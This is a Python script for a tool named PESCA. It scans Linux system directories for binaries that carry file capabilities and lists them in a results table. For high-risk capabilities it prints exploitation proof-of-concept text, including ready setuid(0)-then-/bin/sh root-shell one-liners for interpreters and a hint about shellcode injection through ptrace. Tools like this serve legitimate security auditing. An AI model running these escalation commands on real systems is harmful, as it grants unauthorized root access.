import os
import stat
import struct
import ctypes
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich import box

# Initialize Rich console
console = Console()

# Load C library to invoke getxattr directly without external binaries
libc = ctypes.CDLL("libc.so.6", use_errno=True)

CAP_NAMES = {
    0: "CAP_CHOWN", 1: "CAP_DAC_OVERRIDE", 2: "CAP_DAC_READ_SEARCH",
    3: "CAP_FOWNER", 4: "CAP_FSETID", 5: "CAP_KILL", 6: "CAP_SETGID",
    7: "CAP_SETUID", 8: "CAP_SETPCAP", 9: "CAP_LINUX_IMMUTABLE",
    10: "CAP_NET_BIND_SERVICE", 11: "CAP_NET_BROADCAST", 12: "CAP_NET_ADMIN",
    13: "CAP_NET_RAW", 14: "CAP_IPC_LOCK", 15: "CAP_IPC_OWNER",
    16: "CAP_SYS_MODULE", 17: "CAP_SYS_RAWIO", 18: "CAP_SYS_CHROOT",
    19: "CAP_SYS_PTRACE", 20: "CAP_SYS_PACCT", 21: "CAP_SYS_ADMIN",
    22: "CAP_SYS_BOOT", 23: "CAP_SYS_NICE", 24: "CAP_SYS_RESOURCE",
    25: "CAP_SYS_TIME", 26: "CAP_SYS_TTY_CONFIG", 27: "CAP_MKNOD",
    28: "CAP_LEASE", 29: "CAP_AUDIT_WRITE", 30: "CAP_AUDIT_CONTROL",
    31: "CAP_SETFCAP"
}

HIGH_RISK_CAPS = [
    "CAP_SETUID", "CAP_SETGID", "CAP_DAC_READ_SEARCH", 
    "CAP_DAC_OVERRIDE", "CAP_SYS_PTRACE", "CAP_SYS_ADMIN"
]


def get_file_capabilities(filepath):
    """Reads security.capability extended attribute via raw C call (libc.getxattr)."""
    buf = ctypes.create_string_buffer(20)
    res = libc.getxattr(filepath.encode(), b"security.capability", buf, len(buf))
    if res < 8:
        return []

    data = buf.raw[:res]
    permitted = struct.unpack("<I", data[4:8])[0]
    
    return [cap_name for cap_bit, cap_name in CAP_NAMES.items() if permitted & (1 << cap_bit)]


def get_poc_text(filepath, cap):
    """Returns targeted escalation syntax based on binary name and capability."""
    binary_name = os.path.basename(filepath)
    
    if cap == "CAP_SETUID":
        if binary_name in ["python", "python3", "perl", "ruby"]:
            return f"{filepath} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
        elif binary_name == "php":
            return f"{filepath} -r \"posix_setuid(0); system('/bin/sh');\""
        else:
            return f"{binary_name} can switch process execution context directly to UID 0."
            
    elif cap == "CAP_SETGID":
        return f"{binary_name} can switch process execution context directly to GID 0 (root/shadow)."
        
    elif cap in ["CAP_DAC_READ_SEARCH", "CAP_DAC_OVERRIDE"]:
        return f"{binary_name} bypasses standard file permission checks for read/write access."
        
    elif cap == "CAP_SYS_PTRACE":
        return f"Inject shellcode directly into running root processes using {binary_name}."
    
    elif cap == "CAP_SYS_ADMIN":
        return f"{binary_name} has broad administrative privileges (mounts, cgroups, namespaces)."

    return "Inspect binary for custom capability escalation vectors."


def scan_file_capabilities(search_paths):
    """Scans system directories for binaries with set capabilities and renders Rich output."""
    results = []

    with console.status("[bold green]PESCA running capability discovery...", spinner="dots"):
        for base_path in search_paths:
            if not os.path.exists(base_path):
                continue

            for root, _, files in os.walk(base_path):
                for f in files:
                    filepath = os.path.join(root, f)
                    try:
                        st = os.stat(filepath, follow_symlinks=False)
                        if stat.S_ISREG(st.st_mode):
                            caps = get_file_capabilities(filepath)
                            if caps:
                                results.append((filepath, caps))
                    except (PermissionError, FileNotFoundError):
                        continue

    if not results:
        console.print("[yellow][-] No extra file capabilities discovered.[/yellow]")
        return

    table = Table(
        title="PESCA - Discovered Capability Audit Results",
        box=box.ROUNDED,
        header_style="bold cyan",
        expand=True
    )
    
    table.add_column("Status", style="bold", width=12, justify="center")
    table.add_column("Binary Path", style="bold white", ratio=2)
    table.add_column("Capabilities", style="bold yellow", ratio=2)
    table.add_column("Exploitation PoC / Notes", style="green", ratio=3)

    for filepath, caps in results:
        is_high_risk = any(cap in HIGH_RISK_CAPS for cap in caps)
        status_tag = "[bold red]HIGH-RISK[/bold red]" if is_high_risk else "[bold yellow]INFO[/bold yellow]"
        
        caps_str = ", ".join(caps)
        pocs = []
        
        for cap in caps:
            if cap in HIGH_RISK_CAPS:
                pocs.append(get_poc_text(filepath, cap))
        
        poc_display = "\n".join(pocs) if pocs else "[dim]No direct standard PoC[/dim]"
        
        table.add_row(status_tag, filepath, caps_str, poc_display)

    console.print(table)


def main():
    # Centered ASCII banner for "PESCA"
    banner_text = Text(
        "██████╗ ███████╗███████╗ ██████╗ █████╗ \n"
        "██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗\n"
        "██████╔╝█████╗  ███████╗██║     ███████║\n"
        "██╔═══╝ ██╔══╝  ╚════██║██║     ██╔══██║\n"
        "██║     ███████╗███████║╚██████╗██║  ██║\n"
        "╚═╝     ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝",
        style="bold green",
        justify="center"
    )

    console.print(
        Panel(
            banner_text,
            title="[bold white]PESCA[/bold white]",
            subtitle="[dim white]Privilege Escalation & Security Capability Auditor | v1.0[/dim white]",
            border_style="green",
            padding=(1, 2)
        )
    )

    target_directories = ["/usr/bin", "/usr/sbin", "/usr/local/bin", "/bin", "/sbin", "/opt"]
    scan_file_capabilities(target_directories)


if __name__ == "__main__":
    main()
